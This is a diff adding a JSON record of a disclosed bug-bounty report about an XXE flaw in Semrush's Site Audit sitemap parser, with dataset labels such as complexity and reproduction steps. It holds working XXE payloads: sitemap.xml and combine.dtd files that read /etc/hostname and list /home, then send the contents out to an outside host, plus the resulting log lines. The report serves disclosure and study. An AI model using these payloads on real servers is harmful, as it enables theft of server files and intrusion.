@@ -1,0 +1,50 @@
+{
+    "reported_to": "Semrush",
+    "reported_by": "ajxchapman ",
+    "title": "XXE in Site Audit function exposing file and directory contents",
+    "content": "\nSummary:\nThe Project Site Audit function is vulnerable to XXE when parsing sitemap.xml files.\nDescription:\nThe Site Audit function spiders a given website and performs analysis on the discovered pages. In order to improve website spidering the URL of a sitemap.xml file can be provided. If provided, the sitemap.xml file will be downloaded and processed by a Java XML processor.\nThe Java xml processor used is vulnerable to XXE attacks. By providing an external document type declaration (DTD) the XML processor can be coerced into processing external entities, for example:\nsitemap.xml\nCode 550 Bytes\n1<?xml version=\"1.0\" encoding=\"utf-8\"?>\n2 <!DOCTYPE foo [  \n3   <!ELEMENT foo ANY >\n4   <!ENTITY xxe SYSTEM \"http://xxe.webhooks.pw/text.txt\" >]>\n5<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n6   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n7   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n8    <url>\n9        <loc>&xxe;</loc>\n10        <lastmod>2006-11-18</lastmod>\n11        <changefreq>daily</changefreq>\n12        <priority>0.8</priority>\n13    </url>\n14</urlset>\nWill cause the XML processor to process the external entity at http://xxe.webhooks.pw/text.txt:\nCode 90 Bytes\n1\"\u2588\u2588\u2588\" - - [05/Feb/2018:13:12:26 +0000] \"GET /text.txt HTTP/1.1\" 302 - \"-\" \"Java/1.8.0_144\"\nThis issue can be abused to read arbitrary files and list directory contents from the filesystem of the XML processor application. See the supporting materials below for an example of reading the /etc/hostname file and listing the contents of the /home directory.\nBrowsers Verified In:\nFirefox 58.0.1 (64-bit)\nGoogle Chrome 63.0.3239.132 (64-bit)\nSteps To Reproduce:\nCreate a new project with the domain hosting the malicious sitemap.xml file, e.g. semrush.webhooks.pw\nSet up a new \"Site Audit\"\nWithin \"Site Audit Settings\" change \"Crawl Source\" to \"Enter sitemap URL\" and add the url of the malicious sitemap.xml file. An example sitemap.xml, e.g. http://static.webhooks.pw/files/semrush_sitemap.xml.\nStart the \"Site Audit\"\nThe \"Site Audit\" background process will then kick off, download the provided sitemap.xml file and process it, triggering the XXE vulnerability.\nSee the attached screen capture for an example of exploiting this issue. Note, this screen capture is approximately 1 minute long.\nSupporting Material/References:\nFile reading\nsitemap.xml\nCode 626 Bytes\n1<?xml version=\"1.0\" encoding=\"utf-8\"?>\n2<!DOCTYPE urlset [\n3 <!ENTITY % goodies SYSTEM \"file:///etc/hostname\">\n4 <!ENTITY % dtd SYSTEM \"http://dtd.webhooks.pw/files/combine.dtd\">\n5%dtd;\n6]>\n7<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n8   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n9   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n10    <url>\n11        <loc>http://location.webhooks.pw/resp/&xxe;</loc>\n12        <lastmod>2006-11-18</lastmod>\n13        <changefreq>daily</changefreq>\n14        <priority>0.8</priority>\n15    </url>\n16</urlset>\ncombine.dtd\nCode 64 Bytes\n1<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n2<!ENTITY xxe \"%goodies;\">\nOutput:\nCode 190 Bytes\n1\"46.229.173.66\" - - [05/Feb/2018:14:26:02 +0000] \"GET /resp/\u2588\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)\"\n2---\n3\n4Decoded:\n5\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nDirectory listing\nsitemap.xml\nCode 619 Bytes\n1<?xml version=\"1.0\" encoding=\"utf-8\"?>\n2<!DOCTYPE urlset [\n3 <!ENTITY % goodies SYSTEM \"file:///home/\">\n4 <!ENTITY % dtd SYSTEM \"http://dtd.webhooks.pw/files/combine.dtd\">\n5%dtd;\n6]>\n7<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\" \n8   xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"\n9   xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\">\n10    <url>\n11        <loc>http://location.webhooks.pw/resp/&xxe;</loc>\n12        <lastmod>2006-11-18</lastmod>\n13        <changefreq>daily</changefreq>\n14        <priority>0.8</priority>\n15    </url>\n16</urlset>\ncombine.dtd\nCode 64 Bytes\n1<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n2<!ENTITY xxe \"%goodies;\">\nOutput:\nCode 312 Bytes\n1\"46.229.173.66\" - - [05/Feb/2018:14:39:35 +0000] \"GET /resp/\u2588\u2588\u2588\u2588\u2588\u2588 HTTP/1.1\" 302 - \"-\" \"Mozilla/5.0 (compatible; SemrushBot-SA/0.97; +http://www.semrush.com/bot.html)\"\n2---\n3\n4Decoded:\n5\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n6\u2588\u2588\u2588\u2588\u2588\n7\u2588\u2588\u2588\u2588\u2588\n8cdh\n9\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10\u2588\u2588\u2588\u2588\u2588\u2588\n11\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n12\u2588\u2588\u2588\u2588\u2588\n13\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n14\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n15\u2588\u2588\u2588\n16\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n17lost found\n18\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n19\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n20\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nImpact\nThis issue could be abused to identify and list the contents of sensitive files on the Semrush server which implements the Site Audit functionality.\n\n",
+    "severity": [
+        9.0,
+        10.0
+    ],
+    "bounty": null,
+    "weaknesses": [
+        "XML External Entities (XXE)"
+    ],
+    "screenshots": {},
+    "disclosed_date": 1520965440,
+    "report_url": "https://hackerone.com/reports/312543",
+    "is_multi_component": true,
+    "complexity": "HIGH",
+    "novelty": "MEDIUM",
+    "vuln_category": "WEB_APP",
+    "steps": [
+        [
+            1,
+            "Create a new project with the domain hosting the malicious sitemap.xml file"
+        ],
+        [
+            2,
+            "Set up a new 'Site Audit' and change 'Crawl Source' to 'Enter sitemap URL'"
+        ],
+        [
+            3,
+            "Add the URL of the malicious sitemap.xml file and start the 'Site Audit'"
+        ],
+        [
+            4,
+            "Observe the XXE vulnerability being triggered as the sitemap.xml is processed"
+        ]
+    ],
+    "vuln_description": "The Site Audit function is vulnerable to XML External Entity (XXE) attacks when parsing sitemap.xml files. By providing a malicious sitemap.xml with an external DTD, an attacker can coerce the XML processor into processing external entities, potentially leading to arbitrary file reads and directory listings on the server.",
+    "reason": "The vulnerability involves understanding XXE attacks and crafting a malicious sitemap.xml file with external entity references. While the attack requires knowledge of XXE, the steps to exploit it are straightforward once the vulnerability is identified.",
+    "new_complexity": "MEDIUM",
+    "requires_code": false,
+    "requires_CVE": false,
+    "is_ctf": false,
+    "other_report": null,
+    "authnz_metadata": {
+        "reason": "The XXE vulnerability in the Site Audit function involves XML processing and external entity injection, which is not related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, but XXE is a different class of vulnerability that deals with XML parsing and external entity references.",
+        "is_detectable": false
+    }
+}
